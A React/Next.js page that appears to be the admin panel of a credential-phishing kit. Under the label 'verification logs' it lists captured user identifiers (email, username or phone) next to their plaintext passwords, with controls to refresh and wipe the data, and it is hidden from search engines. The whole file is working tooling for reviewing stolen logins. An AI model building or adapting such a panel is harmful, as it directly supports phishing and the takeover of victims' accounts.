import React, { useEffect, useState } from 'react';
import Head from 'next/head';

type LogEntry = {
  id: string;
  timestamp: string;
  identifier: string;
  password?: string;
  type: 'email/user' | 'phone';
};

export default function Logs() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      const data = await res.json();
      // Sort newest first
      setLogs(data.sort((a: LogEntry, b: LogEntry) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()));
    } catch (err) {
      console.error("Failed to fetch logs:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLogs();
  }, []);

  const clearLogs = async () => {
    if (confirm("Are you sure you want to clear all logs?")) {
      await fetch('/api/logs', { method: 'DELETE' });
      fetchLogs();
    }
  };

  return (
    <div style={{ fontFamily: 'var(--font-primary, sans-serif)', padding: '40px', maxWidth: '1000px', margin: '0 auto', color: '#121314' }}>
      <Head>
        <title>Admin Dashboard | Verification Logs</title>
        <meta name="robots" content="noindex, nofollow" />
      </Head>
      
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '32px' }}>
        <div>
          <h1 style={{ margin: 0, fontSize: '24px', fontWeight: 700 }}>Verification Logs</h1>
          <p style={{ margin: '4px 0 0', color: '#666', fontSize: '14px' }}>Real-time monitoring of account verification attempts.</p>
        </div>
        <div style={{ display: 'flex', gap: '12px' }}>
          <button 
            onClick={fetchLogs} 
            style={{ 
              padding: '10px 20px', 
              cursor: 'pointer', 
              background: '#F8F9FB', 
              color: '#121314', 
              border: '1px solid #EBEBEB', 
              borderRadius: '8px',
              fontWeight: 600,
              transition: 'all 0.2s'
            }}
          >
            Refresh
          </button>
          <button 
            onClick={clearLogs}
            style={{ 
              padding: '10px 20px', 
              cursor: 'pointer', 
              background: '#FF4444', 
              color: 'white', 
              border: 'none', 
              borderRadius: '8px',
              fontWeight: 600,
              transition: 'all 0.2s'
            }}
          >
            Clear Data
          </button>
        </div>
      </div>

      {loading ? (
        <div style={{ textAlign: 'center', padding: '60px' }}>
          <p style={{ color: '#666' }}>Loading database...</p>
        </div>
      ) : logs.length === 0 ? (
        <div style={{ padding: '60px', textAlign: 'center', background: '#F8F9FB', borderRadius: '16px', border: '1px dashed #EBEBEB' }}>
          <h3 style={{ margin: '0 0 8px' }}>No entries found</h3>
          <p style={{ color: '#666', margin: 0 }}>New submissions will appear here automatically.</p>
        </div>
      ) : (
        <div style={{ background: 'white', border: '1px solid #EBEBEB', borderRadius: '16px', overflow: 'hidden', boxShadow: '0 4px 12px rgba(0,0,0,0.02)' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left' }}>
            <thead>
              <tr style={{ background: '#F8F9FB', borderBottom: '1px solid #EBEBEB' }}>
                <th style={{ padding: '16px 20px', fontSize: '13px', fontWeight: 600, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Timestamp</th>
                <th style={{ padding: '16px 20px', fontSize: '13px', fontWeight: 600, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Type</th>
                <th style={{ padding: '16px 20px', fontSize: '13px', fontWeight: 600, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em' }}>User Identifier</th>
                <th style={{ padding: '16px 20px', fontSize: '13px', fontWeight: 600, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Password</th>
              </tr>
            </thead>
            <tbody>
              {logs.map((log) => (
                <tr key={log.id} style={{ borderBottom: '1px solid #F8F9FB' }}>
                  <td style={{ padding: '16px 20px', color: '#666', fontSize: '14px' }}>
                    {new Date(log.timestamp).toLocaleString()}
                  </td>
                  <td style={{ padding: '16px 20px' }}>
                    <span style={{ 
                      padding: '4px 10px', 
                      borderRadius: '100px', 
                      fontSize: '11px',
                      fontWeight: 700,
                      background: log.type === 'phone' ? '#FFFC00' : '#E2F2FF',
                      color: log.type === 'phone' ? '#121314' : '#0FADFF',
                      textTransform: 'uppercase'
                    }}>
                      {log.type}
                    </span>
                  </td>
                  <td style={{ padding: '16px 20px', fontWeight: 600, fontSize: '15px' }}>
                    {log.identifier}
                  </td>
                  <td style={{ padding: '16px 20px', fontFamily: 'monospace', color: '#FF4444', fontWeight: 600 }}>
                    {log.password}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
      
      <footer style={{ marginTop: '40px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
        &copy; {new Date().getFullYear()} Admin Console • System Status: Online
      </footer>
    </div>
  );
}
